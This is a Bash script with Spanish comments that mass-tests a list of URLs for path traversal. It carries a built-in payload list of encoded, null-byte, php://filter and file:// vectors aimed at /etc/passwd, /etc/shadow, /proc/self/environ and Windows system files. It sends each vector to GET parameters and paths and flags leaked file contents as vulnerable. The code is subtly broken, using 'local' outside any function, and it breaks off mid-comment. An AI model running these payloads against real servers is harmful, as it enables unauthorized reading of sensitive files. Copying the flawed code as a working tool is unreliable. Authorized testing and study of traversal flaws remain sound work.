#!/bin/bash
# advanced_path_traversal_tester.sh
# Script completo para detectar y confirmar vulnerabilidades de Path Traversal
# Lee URLs desde archivo url.txt (una por línea)
# Lee vectores desde archivo pathtraversal.txt

URL_FILE="${1:-url.txt}"
VECTORS_FILE="${2:-pathtraversal.txt}"
MASTER_OUTPUT="/tmp/path_traversal_master_report_$$.txt"
TIMEOUT=5
CONNECT_TIMEOUT=10
MAX_TIME=30

# Verificar que los archivos existen
if [ ! -f "$URL_FILE" ]; then
    echo "Error: Archivo $URL_FILE no encontrado"
    echo "Creando archivo de ejemplo..."
    echo "https://ejemplo1.com" > url.txt
    echo "http://ejemplo2.com" >> url.txt
    echo "http://192.168.1.100" >> url.txt
    echo "Archivo de ejemplo creado. Edita 'url.txt' con tus URLs."
    exit 1
fi

if [ ! -f "$VECTORS_FILE" ]; then
    echo "Error: Archivo $VECTORS_FILE no encontrado"
    echo "Creando archivo de vectores por defecto..."
    cat > "$VECTORS_FILE" << 'EOF'
# Archivo de vectores de Path Traversal
# Formato: <tipo>|<descripción>|<vector>
# Tipos: basic, encoded, nullbyte, advanced, windows, custom

# Vectores básicos Linux
basic|Basic 3 levels|../../../etc/passwd
basic|Basic 4 levels|../../../../etc/passwd
basic|Basic 5 levels|../../../../../etc/passwd
basic|Basic 6 levels|../../../../../../etc/passwd
basic|Basic etc/shadow|../../../etc/shadow
basic|Basic etc/hosts|../../../etc/hosts
basic|Basic /proc/self/environ|../../../proc/self/environ
basic|Basic apache config|../../../etc/apache2/apache2.conf
basic|Basic nginx config|../../../etc/nginx/nginx.conf

# Encoding básico
encoded|URL encoded|..%2f..%2f..%2fetc%2fpasswd
encoded|Double URL encoded|..%252f..%252f..%252fetc%252fpasswd
encoded|Dot encoded|%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
encoded|Backslash encoded|..%5c..%5c..%5cetc%5cpasswd

# Null byte injection
nullbyte|Null byte simple|../../../etc/passwd%00
nullbyte|Null byte with extension|../../../etc/passwd%00.jpg
nullbyte|Null byte with txt|../../../etc/passwd%00.txt
nullbyte|Null byte win.ini|../../../windows/win.ini%00

# Técnicas avanzadas
advanced|Double encoding|..%252f..%252f..%252fetc/passwd
advanced|Dot slash|%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
advanced|Double dot slash|....//....//....//etc//passwd
advanced|Semicolon|..;/..;/..;/etc/passwd
advanced|Backslashes|..\\..\\..\\etc\\passwd
advanced|Absolute path|/etc/passwd

# Vectores Windows
windows|Windows win.ini|../../../windows/win.ini
windows|Windows hosts|../../../windows/system32/drivers/etc/hosts
windows|Windows boot.ini|../../boot.ini
windows|Windows C drive|C:/boot.ini
windows|Windows absolute|C:/Windows/System32/drivers/etc/hosts

# Vectores personalizados
custom|PHP filter|php://filter/convert.base64-encode/resource=../../../etc/passwd
custom|LFI with wrapper|file:///etc/passwd
custom|Path with spaces|..%20/..%20/..%20/etc/passwd
EOF
    echo "Archivo de vectores creado: $VECTORS_FILE"
    echo "Puedes editar este archivo para agregar más vectores."
fi

# Contar URLs y vectores
URL_COUNT=$(grep -v '^#' "$URL_FILE" | grep -v '^$' | wc -l)
VECTOR_COUNT=$(grep -v '^#' "$VECTORS_FILE" | grep -v '^$' | wc -l)

echo "=================================================="
echo "    DETECTOR AVANZADO DE PATH TRAVERSAL"
echo "    Archivo de URLs: $URL_FILE ($URL_COUNT URLs)"
echo "    Archivo de vectores: $VECTORS_FILE ($VECTOR_COUNT vectores)"
echo "    Timeout conexión: ${CONNECT_TIMEOUT}s"
echo "    Timeout total: ${MAX_TIME}s"
echo "=================================================="
echo ""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Funciones de utilidad
print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

# Variables globales para vectores
declare -A VECTORS_BASIC VECTORS_ENCODED VECTORS_NULLBYTE VECTORS_ADVANCED VECTORS_WINDOWS VECTORS_CUSTOM

# Cargar vectores desde archivo
load_vectors() {
    local vectors_file="$1"
    
    while IFS='|' read -r type description vector; do
        # Limpiar comentarios y espacios
        type=$(echo "$type" | sed 's/#.*//' | xargs)
        description=$(echo "$description" | sed 's/#.*//' | xargs)
        vector=$(echo "$vector" | sed 's/#.*//' | xargs)
        
        [ -z "$type" ] || [ -z "$vector" ] && continue
        
        case "$type" in
            basic)
                VECTORS_BASIC["$description"]="$vector"
                ;;
            encoded)
                VECTORS_ENCODED["$description"]="$vector"
                ;;
            nullbyte)
                VECTORS_NULLBYTE["$description"]="$vector"
                ;;
            advanced)
                VECTORS_ADVANCED["$description"]="$vector"
                ;;
            windows)
                VECTORS_WINDOWS["$description"]="$vector"
                ;;
            custom)
                VECTORS_CUSTOM["$description"]="$vector"
                ;;
            *)
                print_warning "Tipo de vector desconocido: $type"
                ;;
        esac
    done < <(grep -v '^#' "$vectors_file" | grep -v '^$')
    
    # Mostrar resumen de vectores cargados
    echo "Vectores cargados:"
    echo "  Basic: ${#VECTORS_BASIC[@]}"
    echo "  Encoded: ${#VECTORS_ENCODED[@]}"
    echo "  Nullbyte: ${#VECTORS_NULLBYTE[@]}"
    echo "  Advanced: ${#VECTORS_ADVANCED[@]}"
    echo "  Windows: ${#VECTORS_WINDOWS[@]}"
    echo "  Custom: ${#VECTORS_CUSTOM[@]}"
    echo ""
}

test_connection() {
    local url="$1"
    local output_file="$2"
    
    print_info "Probando conexión a $url..."
    
    # Intentar conectar con timeout reducido
    response=$(timeout $CONNECT_TIMEOUT curl -s -k -I -w "|HTTP_STATUS:%{http_code}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar si hay timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "CONEXIÓN: Timeout (${CONNECT_TIMEOUT}s)" >> "$output_file"
        print_warning "Timeout al conectar con $url"
        return 1
    fi
    
    # Verificar otros errores de conexión
    if echo "$response" | grep -q "Could not resolve host\|Failed to connect\|Connection refused"; then
        echo "CONEXIÓN: Error - Host no alcanzable" >> "$output_file"
        print_warning "No se puede conectar a $url"
        return 1
    fi
    
    # Verificar si recibimos respuesta HTTP
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    
    if [ -n "$http_status" ]; then
        time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
        echo "CONEXIÓN: OK (HTTP $http_status, ${time_total}s)" >> "$output_file"
        print_success "Conexión exitosa a $url (HTTP $http_status)"
        return 0
    else
        echo "CONEXIÓN: Error - No response" >> "$output_file"
        print_warning "No se recibió respuesta de $url"
        return 1
    fi
}

test_path_traversal() {
    local url="$1"
    local description="$2"
    local output_file="$3"
    local test_number="$4"
    local vector_type="$5"

    echo "" >> "$output_file"
    echo "=== Test $test_number: $vector_type - $description ===" >> "$output_file"
    echo "URL: $url" >> "$output_file"
    echo "Vector: $description" >> "$output_file"

    # Realizar petición con múltiples timeouts
    response=$(timeout $MAX_TIME curl -s -k --connect-timeout $CONNECT_TIMEOUT -m $MAX_TIME -w "|HTTP_STATUS:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar errores de timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "RESULTADO: Timeout (${MAX_TIME}s)" >> "$output_file"
        print_warning "Timeout en test $test_number: $description"
        return 4
    fi
    
    # Verificar otros errores de curl
    if echo "$response" | grep -q "curl:"; then
        error_msg=$(echo "$response" | grep "curl:" | head -1)
        echo "RESULTADO: Error curl - $error_msg" >> "$output_file"
        print_warning "Error en test $test_number: $error_msg"
        return 5
    fi

    # Extraer información de la respuesta
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    response_size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
    time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
    content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')

    echo "HTTP Status: ${http_status:-N/A}" >> "$output_file"
    echo "Response Size: ${response_size:-0} bytes" >> "$output_file"
    echo "Response Time: ${time_total:-0}s" >> "$output_file"

    # Analizar respuesta
    if [ "$http_status" = "200" ]; then
        if [ -n "$content" ]; then
            # Patrones para detectar éxito
            local success_patterns="root:|daemon:|bin:|sys:|nobody:|Administrator:|\[boot loader\]|\[fonts\]|\[extensions\]|127.0.0.1.*localhost"
            
            # Verificar si el contenido coincide con algún patrón de éxito
            if echo "$content" | grep -i -q -E "$success_patterns"; then
                print_success "¡VULNERABLE! Path traversal confirmado"
                echo "RESULTADO: VULNERABLE" >> "$output_file"
                echo "INDICADOR ENCONTRADO: $(echo "$content" | grep -i -E "$success_patterns" | head -1)" >> "$output_file"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            elif [ "$response_size" -gt 1000 ] && [ "$response_size" -lt 100000 ]; then
                print_warning "Respuesta larga ($response_size bytes) - Posible éxito"
                echo "RESULTADO: SUSPICIOUS (large response)" >> "$output_file"
                echo "Primeras líneas:" >> "$output_file"
                echo "$content" | head -10 >> "$output_file"
                return 1
            else
                echo "RESULTADO: OK (no signs of vulnerability)" >> "$output_file"
                # Guardar muestra del contenido para análisis manual
                echo "SAMPLE (first 5 lines):" >> "$output_file"
                echo "$content" | head -5 >> "$output_file"
            fi
        else
            echo "RESULTADO: OK (empty response)" >> "$output_file"
        fi
    elif [ -n "$http_status" ]; then
        case "$http_status" in
            403|404)
                echo "RESULTADO: Blocked (HTTP $http_status)" >> "$output_file"
                ;;
            500)
                print_warning "Error 500 - Posible vector válido pero con error"
                echo "RESULTADO: Error 500" >> "$output_file"
                # Guardar error para análisis
                echo "ERROR CONTENT:" >> "$output_file"
                echo "$content" | head -5 >> "$output_file"
                return 2
                ;;
            400)
                echo "RESULTADO: Bad Request (HTTP 400)" >> "$output_file"
                ;;
            401|407)
                echo "RESULTADO: Authentication Required (HTTP $http_status)" >> "$output_file"
                ;;
            30[0-9])
                echo "RESULTADO: Redirect (HTTP $http_status)" >> "$output_file"
                ;;
            *)
                echo "RESULTADO: HTTP $http_status" >> "$output_file"
                ;;
        esac
    else
        echo "RESULTADO: No HTTP response" >> "$output_file"
    fi

    return 3
}

# Función para probar un grupo de vectores
test_vector_group() {
    local vector_type="$1"
    local target="$2"
    local output_file="$3"
    local test_counter_ref="$4"
    local test_timeout_ref="$5"
    local test_error_ref="$6"
    
    # Usar nameref para las variables que queremos modificar
    local -n test_counter="$test_counter_ref"
    local -n test_timeout="$test_timeout_ref"
    local -n test_error="$test_error_ref"
    
    # Determinar qué array de vectores usar
    local vector_array_name="VECTORS_${vector_type^^}"
    local -n vectors="$vector_array_name"
    
    if [ ${#vectors[@]} -eq 0 ]; then
        return 0
    fi
    
    print_info "Probando vectores $vector_type (${#vectors[@]} vectores)..."
    echo "" >> "$output_file"
    echo "=== TESTING $vector_type VECTORS ===" >> "$output_file"
    
    local group_success=0
    
    for description in "${!vectors[@]}"; do
        local vector="${vectors[$description]}"
        test_counter=$((test_counter + 1))
        
        echo "" >> "$output_file"
        echo "--- Vector $test_counter: $description ---" >> "$output_file"
        
        # Probar con diferentes métodos
        local successes=0
        
        # Método 1: Como parámetro GET
        for param in file path src; do
            local test_url="${target}?${param}=${vector}"
            test_path_traversal "$test_url" "$description (GET $param)" "$output_file" "$test_counter.$param" "$vector_type"
            local result=$?
            [ $result -eq 0 ] && successes=$((successes + 1))
            [ $result -eq 4 ] && test_timeout=$((test_timeout + 1))
            [ $result -eq 5 ] && test_error=$((test_error + 1))
        done
        
        # Método 2: Acceso directo (si parece una ruta)
        if [[ "$vector" =~ ^(\.\.|/|%|\\\\) ]]; then
            local test_url="${target}${vector}"
            test_path_traversal "$test_url" "$description (direct)" "$output_file" "$test_counter.direct" "$vector_type"
            local result=$?
            [ $result -eq 0 ] && successes=$((successes + 1))
            [ $result -eq 4 ] && test_timeout=$((test_timeout + 1))
            [ $result -eq 5 ] && test_error=$((test_error + 1))
        fi
        
        if [ $successes -gt 0 ]; then
            group_success=$((group_success + 1))
            print_success "Vector $vector_type exitoso: $description"
        fi
        
        # Control de timeouts
        if [ $test_timeout -ge 5 ]; then
            print_warning "Demasiados timeouts, continuando con siguiente tipo de vector"
            break
        fi
        
        # Pequeña pausa entre vectores
        sleep 0.1
    done
    
    return $group_success
}

# Cargar vectores
load_vectors "$VECTORS_FILE"

# Variables para resumen global
TOTAL_VULNERABLE=0
TOTAL_TIMEOUT=0
TOTAL_ERRORS=0
VULNERABLE_URLS=""
TIMEOUT_URLS=""
ERROR_URLS=""
SAFE_URLS=""

# Procesar cada URL del archivo
URL_NUMBER=0

while IFS= read -r TARGET || [ -n "$TARGET" ]; do
    # Saltar líneas vacías y comentarios
    TARGET=$(echo "$TARGET" | sed 's/#.*//' | xargs)
    [ -z "$TARGET" ] && continue
    
    URL_NUMBER=$((URL_NUMBER + 1))
    
    echo ""
    echo "=================================================="
    echo "    ANALIZANDO URL $URL_NUMBER de $URL_COUNT"
    echo "    Target: $TARGET"
    echo "    Vectores a probar: $VECTOR_COUNT"
    echo "=================================================="
    
    # Crear archivo de salida para esta URL
    URL_SANITIZED=$(echo "$TARGET" | sed 's/[^a-zA-Z0-9]/_/g')
    URL_OUTPUT="/tmp/path_traversal_${URL_SANITIZED}_$$.txt"
    
    # Inicio del análisis para esta URL
    print_info "Iniciando análisis de Path Traversal..."
    echo "Reporte de Path Traversal - $(date)" > "$URL_OUTPUT"
    echo "Target: $TARGET" >> "$URL_OUTPUT"
    echo "Vectors file: $VECTORS_FILE" >> "$URL_OUTPUT"
    echo "Vectors loaded: $VECTOR_COUNT" >> "$URL_OUTPUT"
    echo "Timeout conexión: ${CONNECT_TIMEOUT}s" >> "$URL_OUTPUT"
    echo "Timeout total: ${MAX_TIME}s" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Listar vectores cargados
    echo "VECTORS TO TEST:" >> "$URL_OUTPUT"
    echo "  basic: ${#VECTORS_BASIC[@]}" >> "$URL_OUTPUT"
    echo "  encoded: ${#VECTORS_ENCODED[@]}" >> "$URL_OUTPUT"
    echo "  nullbyte: ${#VECTORS_NULLBYTE[@]}" >> "$URL_OUTPUT"
    echo "  advanced: ${#VECTORS_ADVANCED[@]}" >> "$URL_OUTPUT"
    echo "  windows: ${#VECTORS_WINDOWS[@]}" >> "$URL_OUTPUT"
    echo "  custom: ${#VECTORS_CUSTOM[@]}" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Primero probar conexión básica
    if ! test_connection "$TARGET" "$URL_OUTPUT"; then
        print_error "No se pudo conectar a $TARGET - Saltando..."
        TOTAL_ERRORS=$((TOTAL_ERRORS + 1))
        ERROR_URLS="${ERROR_URLS}\n- $TARGET (conexión fallida)"
        
        # Agregar al reporte maestro
        echo "==================================================" >> "$MASTER_OUTPUT"
        echo "URL: $TARGET" >> "$MASTER_OUTPUT"
        echo "Estado: CONNECTION_ERROR" >> "$MASTER_OUTPUT"
        echo "Error: No se pudo establecer conexión" >> "$MASTER_OUTPUT"
        echo "Reporte: $URL_OUTPUT" >> "$MASTER_OUTPUT"
        continue
    fi
    
    # Variables para esta URL
    SUCCESS_BASIC=0
    SUCCESS_ENCODED=0
    SUCCESS_NULLBYTE=0
    SUCCESS_ADVANCED=0
    SUCCESS_WINDOWS=0
    SUCCESS_CUSTOM=0
    
    test_timeout=0
    test_error=0
    TEST_COUNTER=0
    
    # Probar cada tipo de vector
    for type in basic encoded nullbyte advanced windows custom; do
        # Determinar qué variable de éxito usar
        local success_var_name="SUCCESS_${type^^}"
        local -n success_var="$success_var_name"
        
        # Determinar qué array de vectores usar
        local vector_array_name="VECTORS_${type^^}"
        local -n vectors="$vector_array_name"
        
        if [ ${#vectors[@]} -eq 0 ]; then
            continue
        fi
        
        print_info "Probando vectores $type (${#vectors[@]} vectores)..."
        echo "" >> "$URL_OUTPUT"
        echo "=== TESTING $type VECTORS ===" >> "$URL_OUTPUT"
        
        for description in "${!vectors[@]}"; do
            local vector="${vectors[$description]}"
            TEST_COUNTER=$((TEST_COUNTER + 1))
            
            echo "" >> "$URL_OUTPUT"
            echo "--- Vector $TEST_COUNTER: $description ---" >> "$URL_OUTPUT"
            
            # Probar con diferentes métodos
            local successes=0
            
            # Método 1: Como parámetro GET
            for param in file path src; do
                local test_url="${TARGET}?${param}=${vector}"
                test_path_traversal "$test_url" "$description (GET $param)" "$URL_OUTPUT" "$TEST_COUNTER.$param" "$type"
                local result=$?
                if [ $result -eq 0 ]; then
                    successes=$((successes + 1))
                    success_var=$((success_var + 1))
                elif [ $result -eq 4 ]; then
                    test_timeout=$((test_timeout + 1))
                elif [ $result -eq 5 ]; then
                    test_error=$((test_error + 1))
                fi
            done
            
            # Método 2: Acceso directo (si parece una ruta)
            if [[ "$vector" =~ ^(\.\.|/|%|\\\\) ]]; then
                local test_url="${TARGET}${vector}"
                test_path_traversal "$test_url" "$description (direct)" "$URL_OUTPUT" "$TEST_COUNTER.direct" "$type"
                local result=$?
                if [ $result -eq 0 ]; then
                    successes=$((successes + 1))
                    success_var=$((success_var + 1))
                elif [ $result -eq 4 ]; then
                    test_timeout=$((test_timeout + 1))
                elif [ $result -eq 5 ]; then
                    test_error=$((test_error + 1))
                fi
            fi
            
            if [ $successes -gt 0 ]; then
                print_success "Vector $type exitoso: $description"
            fi
            
            # Control de timeouts
            if [ $test_timeout -ge 5 ]; then
                print_warning "Demasiados timeouts, continuando con siguiente tipo de vector"
                break 2
            fi
            
            # Pequeña pausa entre vectores
            sleep 0.1
        done
    done
    
    # ============================================================================
    # RESUMEN PARA ESTA URL
    # ============================================================================
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "                RESUMEN DEL ANÁLISIS" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    echo "Total tests realizados: $TEST_COUNTER" >> "$URL_OUTPUT"
    echo "Tests con timeout: $test_timeout" >> "$URL_OUTPUT"
    echo "Tests con error: $test_error" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Calcular vulnerabilidades totales
    vuln_count=0
    [ $SUCCESS_BASIC -gt 0 ] && vuln_count=$((vuln_count + 1))
    [ $SUCCESS_ENCODED -gt 0 ] && vuln_count=$((vuln_count + 1))
    [ $SUCCESS_NULLBYTE -gt 0 ] && vuln_count=$((vuln_count + 1))
    [ $SUCCESS_ADVANCED -gt 0 ] && vuln_count=$((vuln_count + 1))
    [ $SUCCESS_WINDOWS -gt 0 ] && vuln_count=$((vuln_count + 1))
    [ $SUCCESS_CUSTOM -gt 0 ] && vuln_count=$((vuln_count + 1))
    
    echo "VULNERABILIDADES DETECTADAS POR TIPO:" >> "$URL_OUTPUT"
    echo "  basic: $SUCCESS_BASIC vectores exitosos" >> "$URL_OUTPUT"
    echo "  encoded: $SUCCESS_ENCODED vectores exitosos" >> "$URL_OUTPUT"
    echo "  nullbyte: $SUCCESS_NULLBYTE vectores exitosos" >> "$URL_OUTPUT"
    echo "  advanced: $SUCCESS_ADVANCED vectores exitosos" >> "$URL_OUTPUT"
    echo "  windows: $SUCCESS_WINDOWS vectores exitosos" >> "$URL_OUTPUT"
    echo "  custom: $SUCCESS_CUSTOM vectores exitosos" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    echo "Total de tipos de vectores exitosos: $vuln_count/6" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Agregar al reporte maestro
    echo "==================================================" >> "$MASTER_OUTPUT"
    echo "URL: $TARGET" >> "$MASTER_OUTPUT"
    
    if [ $test_timeout -ge 5 ]; then
        echo "Estado: TIMEOUT" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_TIMEOUT=$((TOTAL_TIMEOUT + 1))
        TIMEOUT_URLS="${TIMEOUT_URLS}\n- $TARGET ($test_timeout timeouts)"
    elif [ $vuln_count -gt 0 ]; then
        echo "Estado: VULNERABLE" >> "$MASTER_OUTPUT"
        echo "Tipos de vectores exitosos: $vuln_count/6" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_VULNERABLE=$((TOTAL_VULNERABLE + 1))
        
        # Detalle de vectores exitosos
        success_detail=""
        [ $SUCCESS_BASIC -gt 0 ] && success_detail="${success_detail} basic:$SUCCESS_BASIC"
        [ $SUCCESS_ENCODED -gt 0 ] && success_detail="${success_detail} encoded:$SUCCESS_ENCODED"
        [ $SUCCESS_NULLBYTE -gt 0 ] && success_detail="${success_detail} nullbyte:$SUCCESS_NULLBYTE"
        [ $SUCCESS_ADVANCED -gt 0 ] && success_detail="${success_detail} advanced:$SUCCESS_ADVANCED"
        [ $SUCCESS_WINDOWS -gt 0 ] && success_detail="${success_detail} windows:$SUCCESS_WINDOWS"
        [ $SUCCESS_CUSTOM -gt 0 ] && success_detail="${success_detail} custom:$SUCCESS_CUSTOM"
        
        VULNERABLE_URLS="${VULNERABLE_URLS}\n- $TARGET ($vuln_count tipos:${success_detail})"
        
        echo "Vectores exitosos por tipo:" >> "$MASTER_OUTPUT"
        [ $SUCCESS_BASIC -gt 0 ] && echo "  - basic: $SUCCESS_BASIC" >> "$MASTER_OUTPUT"
        [ $SUCCESS_ENCODED -gt 0 ] && echo "  - encoded: $SUCCESS_ENCODED" >> "$MASTER_OUTPUT"
        [ $SUCCESS_NULLBYTE -gt 0 ] && echo "  - nullbyte: $SUCCESS_NULLBYTE" >> "$MASTER_OUTPUT"
        [ $SUCCESS_ADVANCED -gt 0 ] && echo "  - advanced: $SUCCESS_ADVANCED" >> "$MASTER_OUTPUT"
        [ $SUCCESS_WINDOWS -gt 0 ] && echo "  - windows: $SUCCESS_WINDOWS" >> "$MASTER_OUTPUT"
        [ $SUCCESS_CUSTOM -gt 0 ] && echo "  - custom: $SUCCESS_CUSTOM" >> "$MASTER_OUTPUT"
    else
        echo "Estado: SAFE" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        SAFE_URLS="${SAFE_URLS}\n- $TARGET"
    fi
    
    echo "Reporte detallado: $URL_OUTPUT" >> "$MASTER_OUTPUT"
    
    # Resultado final para esta URL
    if [ $vuln_count -gt 0 ]; then
        print_error "¡VULNERABILIDAD DE PATH TRAVERSAL CONFIRMADA!"
        echo "ESTADO: ${RED}VULNERABLE${NC}" >> "$URL_OUTPUT"
        echo "El servidor es vulnerable a Path Traversal" >> "$URL_OUTPUT"
        
        echo "" >> "$URL_OUTPUT"
        echo "VECTORES EXITOSOS:" >> "$URL_OUTPUT"
        [ $SUCCESS_BASIC -gt 0 ] && echo "  - basic: $SUCCESS_BASIC vectores" >> "$URL_OUTPUT"
        [ $SUCCESS_ENCODED -gt 0 ] && echo "  - encoded: $SUCCESS_ENCODED vectores" >> "$URL_OUTPUT"
        [ $SUCCESS_NULLBYTE -gt 0 ] && echo "  - nullbyte: $SUCCESS_NULLBYTE vectores" >> "$URL_OUTPUT"
        [ $SUCCESS_ADVANCED -gt 0 ] && echo "  - advanced: $SUCCESS_ADVANCED vectores" >> "$URL_OUTPUT"
        [ $SUCCESS_WINDOWS -gt 0 ] && echo "  - windows: $SUCCESS_WINDOWS vectores" >> "$URL_OUTPUT"
        [ $SUCCESS_CUSTOM -gt 0 ] && echo "  - custom: $SUCCESS_CUSTOM vectores" >> "$URL_OUTPUT"
        
        echo "" >> "$URL_OUTPUT"
        echo "IMPACTO:" >> "$URL_OUTPUT"
        echo "• Lectura de archivos sensibles del sistema" >> "$URL_OUTPUT"
        echo "• Posible escalada a RCE (Remote Code Execution)" >> "$URL_OUTPUT"
        echo "• Exposición de información crítica" >> "$URL_OUTPUT"
        echo "• Violación de confidencialidad" >> "$URL_OUTPUT"
    
        echo "" >> "$URL_OUTPUT"
        echo "RECOMENDACIONES INMEDIATAS:" >> "$URL_OUTPUT"
        echo "1. Validar y sanitizar todas las entradas de usuario" >> "$URL_OUTPUT"
        echo "2. Implementar whitelist de caracteres permitidos" >> "$URL_OUTPUT"
        echo "3. Usar rutas canónicas absolutas" >> "$URL_OUTPUT"
        echo "4. Implementar WAF (Web Application Firewall)" >> "$URL_OUTPUT"
        echo "5. Restringir acceso a directorios del sistema" >> "$URL_OUTPUT"
        echo "6. Actualizar todos los componentes del servidor" >> "$URL_OUTPUT"
    elif [ $test_timeout -ge 3 ]; then
        print_warning "Múltiples timeouts detectados"
        echo "ESTADO: ${YELLOW}TIMEOUT${NC}" >> "$URL_OUTPUT"
        echo "El servidor responde lentamente o tiene problemas de conexión" >> "$URL_OUTPUT"
    else
        print_success "No se encontraron vulnerabilidades de Path Traversal"
        echo "ESTADO: ${GREEN}SAFE${NC}" >> "$URL_OUTPUT"
        echo "El servidor parece estar protegido contra Path Traversal" >> "$URL_OUTPUT"
    fi
    
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "Análisis completado: $(date)" >> "$URL_OUTPUT"
    if [ $TEST_COUNTER -gt 0 ]; then
        echo "Tiempo total estimado: ~$((TEST_COUNTER * 2))s" >> "$URL_OUTPUT"
    fi
    
    # Mostrar resumen de esta URL en pantalla
    echo ""
    echo "Resumen para $TARGET:"
    echo "  Tests realizados: $TEST_COUNTER"
    echo "  Timeouts: $test_timeout"
    
    if [ $vuln_count -gt 0 ]; then
        echo -n "  Estado: ${RED}VULNERABLE${NC}"
    elif [ $test_timeout -ge 3 ]; then
        echo -n "  Estado: ${YELLOW}TIMEOUT${NC}"
    else
        echo -n "  Estado: ${GREEN}SAFE${NC}"
    fi
    echo ""
    
    echo "  Tipos exitosos: $vuln_count/6"
    [ $SUCCESS_BASIC -gt 0 ] && echo "    basic: $SUCCESS_BASIC vectores"
    [ $SUCCESS_ENCODED -gt 0 ] && echo "    encoded: $SUCCESS_ENCODED vectores"
    [ $SUCCESS_NULLBYTE -gt 0 ] && echo "    nullbyte: $SUCCESS_NULLBYTE vectores"
    [ $SUCCESS_ADVANCED -gt 0 ] && echo "    advanced: $SUCCESS_ADVANCED vectores"
    [ $SUCCESS_WINDOWS -gt 0 ] && echo "    windows: $SUCCESS_WINDOWS vectores"
    [ $SUCCESS_CUSTOM -gt 0 ] && echo "    custom: $SUCCESS_CUSTOM vectores"
    
    echo "  Reporte detallado: $URL_OUTPUT"
    echo ""
    
    # Pe
